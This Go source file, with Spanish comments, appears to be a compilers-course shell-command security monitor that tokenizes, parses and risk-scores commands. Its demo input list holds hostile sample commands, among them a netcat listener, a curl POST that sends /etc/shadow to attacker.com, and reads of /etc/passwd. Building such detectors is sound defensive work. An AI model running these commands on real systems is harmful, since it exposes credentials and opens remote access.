package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"security-monitor/internal/lexer"
	"security-monitor/internal/parser"
	"security-monitor/internal/semantic"
	"security-monitor/internal/models"
)

type SecurityMonitor struct {
	lexer    *lexer.Lexer
	parser   *parser.Parser
	semantic *semantic.Analyzer
	stats    *models.CommandStats
}

func NewSecurityMonitor() *SecurityMonitor {
	return &SecurityMonitor{
		lexer:    lexer.New(),
		parser:   parser.New(),
		semantic: semantic.New(),
		stats:    &models.CommandStats{
			UserStats:       make(map[string]*models.UserStats),
			CategoryStats:   make(map[models.CommandCategory]int),
			ThreatStats:     make(map[models.ThreatCategory]int),
			LastUpdated:     time.Now(),
		},
	}
}

func (sm *SecurityMonitor) ProcessCommand(command string, user string, timestamp time.Time) (*models.AnalysisResult, error) {
	// Actualizar estadísticas
	sm.stats.TotalCommands++
	
	// Fase 1: Análisis Léxico
	tokens, err := sm.lexer.Tokenize(command)
	if err != nil {
		return nil, fmt.Errorf("error en análisis léxico: %w", err)
	}

	// Fase 2: Análisis Sintáctico
	ast, err := sm.parser.Parse(tokens)
	if err != nil {
		// Verificar si es un error de comando inválido
		if cmdErr, ok := err.(*models.CommandValidationError); ok {
			sm.stats.InvalidCommands++
			sm.updateUserInvalidAttempts(user)
			return nil, cmdErr
		}
		return nil, fmt.Errorf("error en análisis sintáctico: %w", err)
	}

	// Fase 3: Análisis Semántico
	result, err := sm.semantic.Analyze(ast, user, timestamp)
	if err != nil {
		return nil, fmt.Errorf("error en análisis semántico: %w", err)
	}

	// Actualizar estadísticas de riesgo
	if result.RiskScore >= models.HighRiskScore {
		sm.stats.RiskyCommands++
	}
	
	if result.IsBlocked {
		sm.stats.BlockedCommands++
	}

	// Agregar tokens al resultado
	result.Tokens = tokens

	return result, nil
}

// isValidCommand verifica rápidamente si un comando es válido
func (sm *SecurityMonitor) isValidCommand(input string) bool {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return false
	}
	
	command := parts[0]
	return sm.lexer.IsKnownCommand(command)
}

// getCommandSuggestions obtiene sugerencias para comandos inválidos
func (sm *SecurityMonitor) getCommandSuggestions(input string) []models.CommandSuggestion {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return []models.CommandSuggestion{}
	}
	
	command := parts[0]
	
	// Verificar errores comunes primero
	commonCorrection := sm.lexer.CheckCommonTypos(command)
	if commonCorrection != "" {
		return []models.CommandSuggestion{
			{
				Original:  command,
				Suggested: commonCorrection,
				Distance:  1,
			},
		}
	}
	
	// Usar distancia de Levenshtein
	return sm.lexer.SuggestSimilarCommands(command)
}

// updateUserInvalidAttempts actualiza las estadísticas de intentos inválidos del usuario
func (sm *SecurityMonitor) updateUserInvalidAttempts(user string) {
	if _, exists := sm.stats.UserStats[user]; !exists {
		sm.stats.UserStats[user] = &models.UserStats{
			LastActivity: time.Now(),
		}
	}
	sm.stats.UserStats[user].InvalidAttempts++
}

func (sm *SecurityMonitor) MonitorCommands(commandChan <-chan models.CommandInput) {
	for cmd := range commandChan {
		result, err := sm.ProcessCommand(cmd.Command, cmd.User, cmd.Timestamp)
		if err != nil {
			// Manejar errores de comando inválido
			if cmdErr, ok := err.(*models.CommandValidationError); ok {
				sm.handleInvalidCommand(cmdErr, cmd.User)
				continue
			}
			log.Printf("Error procesando comando: %v", err)
			continue
		}

		if result.RiskScore >= models.HighRiskScore {
			sm.handleHighRiskAlert(result)
		}

		sm.logResult(result)
	}
}

func (sm *SecurityMonitor) handleInvalidCommand(cmdErr *models.CommandValidationError, user string) {
	fmt.Printf("⚠️  COMANDO INVÁLIDO - Usuario: %s\n", user)
	fmt.Printf("   Comando: %s\n", cmdErr.OriginalCommand)
	
	if len(cmdErr.Suggestions) > 0 {
		fmt.Printf("   💡 Sugerencias:\n")
		for i, suggestion := range cmdErr.Suggestions {
			if i < 3 { // Máximo 3 sugerencias
				fmt.Printf("      • %s\n", suggestion.Suggested)
			}
		}
	}
	fmt.Println(strings.Repeat("-", 40))
}

func (sm *SecurityMonitor) handleHighRiskAlert(result *models.AnalysisResult) {
	fmt.Printf("🚨 ALERTA DE ALTA PRIORIDAD 🚨\n")
	fmt.Printf("Usuario: %s\n", result.User)
	fmt.Printf("Comando: %s\n", result.OriginalCommand)
	fmt.Printf("Nivel de Riesgo: %s\n", result.RiskLevel)
	fmt.Printf("Puntuación: %.2f\n", result.RiskScore)
	fmt.Printf("Razones: %v\n", result.Reasons)
	fmt.Printf("Timestamp: %s\n", result.Timestamp.Format(time.RFC3339))
	fmt.Println(strings.Repeat("-", 50))
}

func (sm *SecurityMonitor) logResult(result *models.AnalysisResult) {
	if result.RiskScore > models.LowRiskScore {
		log.Printf("Usuario: %s | Comando: %s | Riesgo: %s (%.2f)",
			result.User, result.OriginalCommand, result.RiskLevel, result.RiskScore)
	}
}

// showStats muestra estadísticas del sistema
func (sm *SecurityMonitor) showStats() {
	fmt.Printf("\n📊 ESTADÍSTICAS DEL SISTEMA\n")
	fmt.Printf("═══════════════════════════\n")
	fmt.Printf("📝 Comandos totales: %d\n", sm.stats.TotalCommands)
	fmt.Printf("⚠️  Comandos riesgosos: %d\n", sm.stats.RiskyCommands)
	fmt.Printf("🚫 Comandos bloqueados: %d\n", sm.stats.BlockedCommands)
	fmt.Printf("❌ Comandos inválidos: %d\n", sm.stats.InvalidCommands)
	
	if len(sm.stats.UserStats) > 0 {
		fmt.Printf("\n👥 ESTADÍSTICAS POR USUARIO:\n")
		for user, stats := range sm.stats.UserStats {
			fmt.Printf("   %s: %d comandos, %d inválidos\n", 
				user, stats.CommandCount, stats.InvalidAttempts)
		}
	}
	
	fmt.Printf("\nÚltima actualización: %s\n", sm.stats.LastUpdated.Format("15:04:05"))
	fmt.Println()
}

// showHelp muestra la ayuda del sistema
func (sm *SecurityMonitor) showHelp() {
	fmt.Printf("\n🔍 SISTEMA DE MONITOREO DE SEGURIDAD\n")
	fmt.Printf("══════════════════════════════════\n")
	fmt.Printf("Comandos disponibles:\n")
	fmt.Printf("  📝 <comando>  - Analizar comando\n")
	fmt.Printf("  📊 stats      - Mostrar estadísticas\n")
	fmt.Printf("  ❓ help       - Mostrar esta ayuda\n")
	fmt.Printf("  🔄 clear      - Limpiar pantalla\n")
	fmt.Printf("  🚪 exit       - Salir del programa\n")
	fmt.Printf("\nEjemplos de comandos para probar:\n")
	fmt.Printf("  • ls -la /home\n")
	fmt.Printf("  • sudo cat /etc/passwd\n")
	fmt.Printf("  • find / -name '*.ssh'\n")
	fmt.Printf("  • lst (comando inválido para ver sugerencias)\n")
	fmt.Printf("  • chmdo 777 file.txt (comando mal escrito)\n")
	fmt.Println()
}

func main() {
	fmt.Println("🔍 Sistema de Monitoreo de Seguridad - Compiladores")
	fmt.Println("═══════════════════════════════════════════════════")
	fmt.Println("✅ Análisis léxico, sintáctico y semántico")
	fmt.Println("✅ Detección de comandos inválidos")
	fmt.Println("✅ Sugerencias inteligentes")
	fmt.Println("✅ Monitoreo de seguridad en tiempo real")

	monitor := NewSecurityMonitor()
	scanner := bufio.NewScanner(os.Stdin)
	
	fmt.Println("\n💡 Escribe 'help' para ver los comandos disponibles")
	fmt.Println("Ingresa comandos para analizar (escribe 'exit' para salir):")

	for {
		fmt.Print("\n🔒 monitor> ")
		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		// Comandos especiales del sistema
		switch input {
		case "exit", "quit", "q":
			fmt.Println("👋 ¡Hasta luego! Sistema de monitoreo detenido.")
			return
			
		case "help", "h", "?":
			monitor.showHelp()
			continue
			
		case "stats", "statistics":
			monitor.showStats()
			continue
			
		case "clear", "cls":
			// Limpiar pantalla (funciona en la mayoría de terminales)
			fmt.Print("\033[2J\033[H")
			fmt.Println("🔍 Sistema de Monitoreo de Seguridad - Compiladores")
			continue
		}

		// VALIDACIÓN PREVIA RÁPIDA
		if !monitor.isValidCommand(input) {
			commandParts := strings.Fields(input)
			if len(commandParts) > 0 {
				invalidCommand := commandParts[0]
				fmt.Printf("❌ Comando inválido: '%s'\n", invalidCommand)
				
				suggestions := monitor.getCommandSuggestions(input)
				if len(suggestions) > 0 {
					fmt.Printf("💡 ¿Quisiste decir?\n")
					for i, suggestion := range suggestions {
						if i < 3 { // Máximo 3 sugerencias
							fmt.Printf("   %d. %s\n", i+1, suggestion.Suggested)
						}
					}
				} else {
					fmt.Printf("💭 No se encontraron sugerencias para '%s'\n", invalidCommand)
					fmt.Printf("   Escribe 'help' para ver comandos disponibles\n")
				}
				
				// Actualizar estadísticas
				monitor.stats.InvalidCommands++
				monitor.updateUserInvalidAttempts("usuario_test")
				continue
			}
		}

		// Procesar comando válido
		startTime := time.Now()
		result, err := monitor.ProcessCommand(input, "usuario_test", time.Now())
		if err != nil {
			// Manejar diferentes tipos de errores
			if cmdErr, ok := err.(*models.CommandValidationError); ok {
				fmt.Printf("❌ %s\n", cmdErr.Message)
				
				if len(cmdErr.Suggestions) > 0 {
					fmt.Printf("💡 ¿Quisiste decir?\n")
					for i, suggestion := range cmdErr.Suggestions {
						if i < 3 {
							fmt.Printf("   %d. %s\n", i+1, suggestion.Suggested)
						}
					}
				}
				continue
			}
			
			fmt.Printf("❌ Error: %v\n", err)
			continue
		}

		// Mostrar resultado con formato mejorado
		processingTime := time.Since(startTime)
		
		fmt.Printf("\n📊 ANÁLISIS COMPLETADO\n")
		fmt.Printf("════════════════════\n")
		fmt.Printf("🎯 Comando: %s\n", result.OriginalCommand)
		fmt.Printf("👤 Usuario: %s\n", result.User)
		
		// Color según nivel de riesgo
		riskIcon := getRiskIcon(result.RiskLevel)
		fmt.Printf("%s Nivel de Riesgo: %s\n", riskIcon, result.RiskLevel)
		fmt.Printf("📈 Puntuación: %.2f/10.0\n", result.RiskScore)
		
		if len(result.ThreatCategories) > 0 {
			fmt.Printf("🚨 Categorías de Amenaza:\n")
			for _, category := range result.ThreatCategories {
				fmt.Printf("   • %s\n", category)
			}
		}
		
		if len(result.Reasons) > 0 {
			fmt.Printf("💡 Razones:\n")
			for _, reason := range result.Reasons {
				fmt.Printf("   • %s\n", reason)
			}
		}
		
		if len(result.Recommendations) > 0 {
			fmt.Printf("🔧 Recomendaciones:\n")
			for _, rec := range result.Recommendations {
				fmt.Printf("   • %s\n", rec)
			}
		}
		
		if result.IsBlocked {
			fmt.Printf("🚫 COMANDO BLOQUEADO\n")
		}
		
		fmt.Printf("⏱️  Tiempo de procesamiento: %v\n", processingTime)
		fmt.Printf("🔍 Tokens analizados: %d\n", len(result.Tokens))
	}

	fmt.Println("Sistema de monitoreo detenido.")
}

// getRiskIcon retorna el icono apropiado según el nivel de riesgo
func getRiskIcon(level models.RiskLevel) string {
	switch level {
	case models.NoRisk:
		return "✅"
	case models.LowRisk:
		return "⚠️ "
	case models.MediumRisk:
		return "🟡"
	case models.HighRisk:
		return "🔴"
	case models.CriticalRisk:
		return "💀"
	default:
		return "❓"
	}
}

// simulateCommandInput para demostración (función opcional)
func simulateCommandInput(commandChan chan<- models.CommandInput) {
	// Comandos de ejemplo para demostración
	testCommands := []string{
		"ls -la /home",
		"lst -la",           // Comando inválido
		"sudo cat /etc/passwd",
		"chmdo 777 file",    // Comando mal escrito
		"find / -name '*.ssh' 2>/dev/null",
		"nc -l -p 4444",
		"chmod 777 /tmp/backdoor",
		"curl -X POST https://attacker.com/exfil -d @/etc/shadow",
		"whaoami",           // Comando mal escrito
		"whoami && id && uname -a",
		"ps aux | grep ssh",
	}

	for i, cmd := range testCommands {
		time.Sleep(2 * time.Second)
		commandChan <- models.CommandInput{
			Command:   cmd,
			User:      fmt.Sprintf("user%d", i%3),
			Timestamp: time.Now(),
			Source:    "terminal",
		}
	}
	
	close(commandChan)
}